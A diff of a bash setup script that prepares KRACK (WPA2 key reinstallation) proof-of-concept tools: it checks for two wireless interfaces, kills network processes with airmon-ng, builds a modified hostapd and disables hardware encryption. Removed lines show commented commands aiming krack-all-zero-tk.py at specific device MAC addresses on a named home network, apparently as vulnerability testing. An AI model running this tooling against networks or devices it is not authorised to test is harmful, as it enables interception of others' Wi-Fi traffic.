@@ -4,15 +4,21 @@
 echo "Setting up dependencies..."
 
 
-#Disable network, but ensure the script can still use wifi
-#sudo nmcli radio wifi off
-sudo airmon-ng check kill >> /dev/null
-#ifconfig wlan0 down
-#ifconfig wlan1 down
-sudo rfkill unblock wifi
-
-
 # Set interface variables:
+wlan0=$(echo | ifconfig | sed 's/[ \t].*//;/^$/d' | awk "FNR==3" | tr -d ':')
+wlan1=$(echo | ifconfig | sed 's/[ \t].*//;/^$/d' | awk "FNR==4" | tr -d ':')
+
+# Verify that users have sufficient number of wireless interfaces
+if [[ $wlan0 = *"w"* && $wlan1 = *"w"* ]];
+then
+	echo "Found $wlan0 and $wlan1"
+else
+	echo "Error: insufficient wireless interfaces found. You need an external NIC in addition to your internal NIC."
+	exit
+fi
+
+
+
 #eth0=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==1' | tr -d ':')
 
 #wlan0=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==3' | tr -d ':')
@@ -29,6 +35,11 @@ sudo rfkill unblock wifi
 
 #sed -i 7s/.*/REPEATER=$(sed '7q;d' $wlan1)/ ./krackattacks-poc-zerokey/krackattack/enable_internet_forwarding.sh
 
+
+#Disable network, but ensure the script can still use wifi
+sudo airmon-ng check kill >> /dev/null
+sudo rfkill unblock wifi
+
 # Make modified hostapd instance. Only needs to be done once
 if [[ ! -x "./krackattacks-poc-zerokey/hostapd/hostapd" ]] 
 then 
@@ -39,36 +50,13 @@ then
 	cd ../../
 fi
 
-# TODO should only be run the first time!
-
+# Disable hardware encryption, as bugs on some Wi-Fi network interface cards could interfere with the script used to check whether a client is vulnerable
 if ! cat hwEncryptionDisabled | grep -q '1';
 then 
 	./findVulnerable/krackattack/disable-hwcrypto.sh
 else 
 	echo "Hardware Encryption already disabled"
 fi
-# Disable hardware encryption, as bugs on some Wi-Fi network interface cards could interfere with the script used to check whether a client is vulnerable
 
 # TODO Let user choose whether to reboot computer
-## NOTE not implemented
-#TODO RUN: systool -vm ath9k_htc
-
-## TODO To check: the nohwcript/.. param has been set.
-
-# TODO Look for key reinstallations in the 4-way handshake
-
-
-#TODO alt under her bør slettes 
-#android:
-#./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 98:3f:9f:25:1d:9c
-
-#kali live linux
-#cd /root/krackattacks-poc-zerokey/krackattack/
-#cd krackattacks-poc-zerokey/krackattack/
-
-# fredrik nettbrett
-#./krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa
-
-#fredrik telefon
-#./krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 30:75:12:84:cc:ee
-
+## NOTE not implemented#TODO RUN: systool -vm ath9k_htc
